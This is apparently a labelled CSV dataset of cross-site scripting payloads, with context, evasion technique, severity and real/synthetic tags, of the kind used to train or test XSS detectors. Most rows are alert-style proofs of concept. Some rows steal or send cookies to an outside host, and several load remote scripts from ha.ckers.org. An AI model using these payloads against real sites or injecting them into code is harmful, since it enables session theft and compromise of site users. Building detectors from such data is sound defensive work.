payload,context,technique,severity,length,source
"<noembed oncontextmenu=""alert(1)"">AnonKryptiQuz</noembed>",event_handler,none,medium,57,real
%22 onfocus=alert(document.cookie) autofocus=%22,attribute_escape,synthetic,medium,48,synthetic
"<frame onmouseup=""alert(1)"">AnonKryptiQuz</frame>",event_handler,none,medium,49,real
"""`'><script>\xE2\x80\xA9javascript:alert(5364)</script>",script_injection,none,medium,55,real
"<a onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</a>",event_handler,none,medium,64,real
"<img \x11src=x onerror=""javascript:alert(1)"">",event_handler,none,medium,45,real
"""><svg ontoggl&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,59,synthetic
"%3Cscript%3E/*/confirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,medium,66,synthetic
"<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",script_injection,none,medium,95,real
"<data onmousemove=""alert(1)"">AnonKryptiQuz</data>",event_handler,none,medium,49,real
<svg ontoggl&#101;=confirm(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,55,synthetic
"%27 onfocus=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,58,synthetic
"document.write(""<img src=x onerror=console.log(location.hash)>"")",dom_sink,synthetic,medium,64,synthetic
"<style>:target {color:red;}</style><script id=x style=""transition:color 1s"" ontransitionend=alert(1)></script>",script_injection,none,medium,110,real
""" onfocus=prompt(loc&#97;tion.h&#97;sh) &#97;utofocus=""",attribute_escape,synthetic,medium,55,synthetic
%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aalert%28%2FAnonKryptiQuz%2F%29%22%3E,generic,url_encoding,low,111,real
"<style>li {list-style-image: url(""javascript:document.vulnerable=true;"");</STYLE><UL><LI>XSS",js_uri,none,low,92,real
"<style>:target {transform: rotate(180deg);}</style><audio id=x style=""transition:transform 2s"" ontransitionrun=print()></audio>",event_handler,none,low,127,real
' oNmoUseOveR=cOnfIrm('XSS') ',attribute_escape,synthetic,medium,30,synthetic
<svg ontoggle=\u0061lert(location.hash)>,tag_injection,synthetic,medium,40,synthetic
"<%tag onmouseover=""alert('markitzeroday.com')"">",event_handler,none,medium,47,real
"""><img onload=alert(document.cookie)>",tag_injection,synthetic,medium,37,synthetic
"<big onmouseup=""alert(1)"">AnonKryptiQuz</big>",event_handler,none,medium,45,real
<script /**/>/**/alert(1)/**/</script /**/,script_injection,comment_injection,medium,42,real
javascript:alert(document.domain);,js_uri,none,medium,34,real
"<div draggable=""true"" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>",event_handler,none,medium,107,real
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">",event_handler,case_variation,medium,89,real
<isindex+type=image+src=1+onerror=alert(1)>,event_handler,none,medium,43,real
"<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>",script_injection,encoding,medium,130,real
"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>",event_handler,none,medium,113,real
"<hr onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></hr>",event_handler,none,medium,277,real
"<shadow draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</shadow>",event_handler,none,medium,89,real
"""><svg onload=\u0061lert(document.domain)>",tag_injection,synthetic,medium,42,synthetic
"<video id=x controls onfocusin=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",event_handler,none,medium,92,real
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\""&gt;",event_handler,html_entity,low,120,real
"<hgroup onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></hgroup>",event_handler,none,medium,285,real
<svg ontoggl&#101;=&#97;l&#101;rt(1)>,tag_injection,synthetic,medium,37,synthetic
""" onclick=consol&#101;.log(1) """,attribute_escape,synthetic,medium,31,synthetic
"<pre onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</pre>",event_handler,none,medium,65,real
<iframe// src=javaSCRIPT&colon;alert(1),tag_injection,none,medium,39,real
"<blink id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></blink>",event_handler,none,medium,86,real
"<video onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,71,real
<picture contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,61,real
<style id=x tabindex=1 onfocus=alert(1)></style>,event_handler,none,medium,48,real
<center onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
tagName%2BinnerHTML%2Blocation.hash%3E/*click%20me!#*/alert(document.domain),dom_sink,comment_injection|url_encoding,medium,76,real
"<img src=`javascript:alert(""The name is 'AnonKryptiQuz'"")`>",js_uri,none,medium,59,real
"<img usemap=#x><map name=""x""><area href onfocus=alert(1) id=x>",event_handler,none,medium,62,real
"""><svg onerror=prompt(document.domain)>",tag_injection,synthetic,medium,39,synthetic
"<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>",script_injection,none,low,316,real
"<style>:target {color:red;}</style><label id=x style=""transition:color 1s"" ontransitionstart=alert(1)></label>",event_handler,none,medium,110,real
"<kbd draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",event_handler,none,medium,84,real
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onwebkitanimationend=""alert(1)""></ul>",event_handler,none,medium,95,real
"<i oncontextmenu=""alert(1)"">AnonKryptiQuz</i>",event_handler,none,medium,45,real
<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>,event_handler,none,medium,71,real
<address onpointerleave=alert(1) style=display:block>AnonKryptiQuz</address>,event_handler,none,medium,76,real
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",js_uri,unicode_escape|html_entity,low,52,real
"<u onmouseup=""alert(1)"">AnonKryptiQuz</u>",event_handler,none,medium,41,real
<textarea onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,70,real
"<object data=""javascript:alert(AnonKryptiQuz)"">",js_uri,none,medium,47,real
"<style>:target {color: red;}</style><col id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></col>",event_handler,none,medium,109,real
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('AnonKryptiQuz');"">",event_handler,case_variation,medium,91,real
"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>",event_handler,none,medium,106,real
"%27 ontoggle=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,54,synthetic
<input2 onpointerleave=alert(1) style=display:block>AnonKryptiQuz</input2>,event_handler,none,medium,74,real
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" ontransitionstart=alert(1)></title>",event_handler,none,medium,110,real
"<;DIV STYLE="";width: expression(alert(';XSS';));"";>;",attribute_escape,none,medium,52,real
%3Csvg onfocus=console.log(document.cookie)%3E,tag_injection,synthetic,medium,46,synthetic
' onfocus=alert(document.domain) ',attribute_escape,synthetic,medium,34,synthetic
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",tag_injection,html_entity,medium,61,real
"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></p>",event_handler,none,medium,106,real
<scr	ipt>alert(document.domain)</scr	ipt>,script_injection,synthetic,medium,41,synthetic
"<figure draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</figure>",event_handler,none,medium,70,real
"<div draggable=""true"" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>",event_handler,none,medium,109,real
""" onmous&#101;&#101;nt&#101;r=confirm('XSS') """,attribute_escape,synthetic,medium,46,synthetic
"<animatetransform onclick=""alert(1)"" style=display:block>AnonKryptiQuz</animatetransform>",event_handler,none,medium,89,real
"&lt;SCRIPT/AnonKryptiQuz SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",generic,html_entity,low,94,real
<svg onfocus=console.log('XSS')>,tag_injection,synthetic,medium,32,synthetic
"<script src=""javascript:alert(4728)"">",script_injection,none,medium,37,real
""" oNfoCus=alErt(loCatIon.haSh) auTofOcuS=""",attribute_escape,synthetic,medium,42,synthetic
"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",js_uri,none,medium,51,real
"<address onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</address>",event_handler,none,medium,76,real
"<style>@keyframes x{}</style><header style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></header>",event_handler,none,medium,105,real
<ruby id=x tabindex=1 onbeforeactivate=alert(1)></ruby>,event_handler,none,medium,55,real
"<kbd id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></kbd>",event_handler,none,medium,82,real
"<figcaption oncut=""alert(1)"" contenteditable>AnonKryptiQuz</figcaption>",event_handler,none,medium,71,real
"<sup onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</sup>",event_handler,none,medium,82,real
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
&#X003c;,generic,html_entity,low,8,real
<svg onmous&#101;ov&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,65,synthetic
"<optgroup onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></optgroup>",event_handler,none,medium,289,real
<thead onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
<body/onload=&lt;!--&gt;&#10alert(1)>,event_handler,html_entity,medium,37,real
<head onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</head>,event_handler,none,medium,74,real
"<col id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></col>",event_handler,none,medium,82,real
"<div draggable=""true"" contenteditable>drag me</div><tt ondrop=alert(1) contenteditable style=display:block>drop here</tt>",event_handler,none,medium,121,real
"<style>:target {transform: rotate(180deg);}</style><li id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></li>",event_handler,none,medium,122,real
"<img draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</img>",event_handler,none,medium,62,real
""" onb&#101;gin=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,73,synthetic
"1')""<!--><Svg OnLoad=(confirm)(1)<!--",event_handler,case_variation,low,37,real
"<pre onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</pre>",event_handler,none,medium,82,real
<rp id=x tabindex=1 onbeforedeactivate=alert(1)></rp><input autofocus>,event_handler,none,medium,70,real
<font id=x tabindex=1 onfocusin=alert(1)></font>,event_handler,none,medium,48,real
"<style>:target {color:red;}</style><caption id=x style=""transition:color 1s"" ontransitionend=alert(1)></caption>",event_handler,none,medium,112,real
"""><svg onmous&#101;ov&#101;r=confirm(1)>",tag_injection,synthetic,medium,40,synthetic
"<nav oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</nav>",event_handler,none,medium,58,real
"<input4 draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</input4>",event_handler,none,medium,89,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strike id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></strike>",event_handler,none,medium,182,real
""" onb&#101;gin=consol&#101;.log(1) """,attribute_escape,synthetic,medium,36,synthetic
"<span draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</span>",event_handler,none,medium,66,real
document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(document.cookie) + '>'),dom_sink,encoding,high,98,real
#<><img src=1 onerror=alert(1)>,event_handler,none,medium,31,real
"<object draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</object>",event_handler,none,medium,65,real
"<dfn draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</dfn>",event_handler,none,medium,84,real
"<canvas ondblclick=""alert(1)"">AnonKryptiQuz</canvas>",event_handler,none,medium,52,real
<script>//alert(1)</script>,script_injection,synthetic,medium,27,synthetic
{{constructor.constructor('alert(/AnonKryptiQuz Stored!/)')()}},template_injection,none,medium,63,real
"<script src=""javascript:alert(3)""></script> // IE6, O11.01↓, OM10.1↓//[""'`-->]]>]</div>",script_injection,none,medium,87,real
"""><Svg onMouSeoVer=coNsoLe.Log(doCumEnt.coOkiE)>",tag_injection,synthetic,medium,48,synthetic
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationend=""alert(1)""></strike>",event_handler,none,medium,97,real
"<shadow onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",event_handler,none,medium,70,real
"<form onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</form>",event_handler,none,medium,69,real
"<span draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</span>",event_handler,none,medium,81,real
"document.write(""<img src=x onerror=confirm(location.hash)>"")",dom_sink,synthetic,medium,60,synthetic
"<q onmouseleave=""alert(1)"">AnonKryptiQuz</q>",event_handler,none,medium,44,real
"<script>Object.prototype.url = ['data:,alert(1)//'];Object.prototype.dataType = 'script';</script><script>$.get('https://google.com/');$.post('https://google.com/');</script>",script_injection,obfuscation,high,174,real
"<?php echo('<SCR'); echo('IPT>alert(""AnonKryptiQuz"")</SCRIPT>'); ?>",attribute_escape,case_variation,medium,67,real
"<em onclick=""alert(1)"">AnonKryptiQuz</em>",event_handler,none,medium,41,real
<svg onmous&#101;ov&#101;r=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,72,synthetic
"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></figure>",event_handler,none,medium,172,real
<button popovertarget=x>Click me</button><hgroup ontoggle=alert(1) popover id=x>AnonKryptiQuz</hgroup>,event_handler,none,medium,102,real
<link onpointerup=alert(1) style=display:block>AnonKryptiQuz</link>,event_handler,none,medium,67,real
"<style>@keyframes slidein {}</style><spacer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></spacer>",event_handler,none,medium,166,real
"<li oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
<var contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,57,real
""" onload=confirm(document.cookie) """,attribute_escape,synthetic,medium,35,synthetic
"<kbd onclick=""alert(1)"">AnonKryptiQuz</kbd>",event_handler,none,medium,43,real
"<html oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,98,real
"<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};//'];</script>",script_injection,obfuscation,high,83,real
"""'`><p><svg><script>a='hello\x27;javascript:alert(0017)//';</script></p>",script_injection,none,medium,72,real
"<style>:target {color:red;}</style><bdi id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></bdi>",event_handler,none,medium,110,real
"""><svg onmouseenter=confirm(1)>",tag_injection,synthetic,medium,31,synthetic
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",script_injection,case_variation,low,58,real
"<style>@keyframes x{}</style><bdo style=""animation-name:x"" onanimationstart=""alert(1)""></bdo>",event_handler,none,medium,93,real
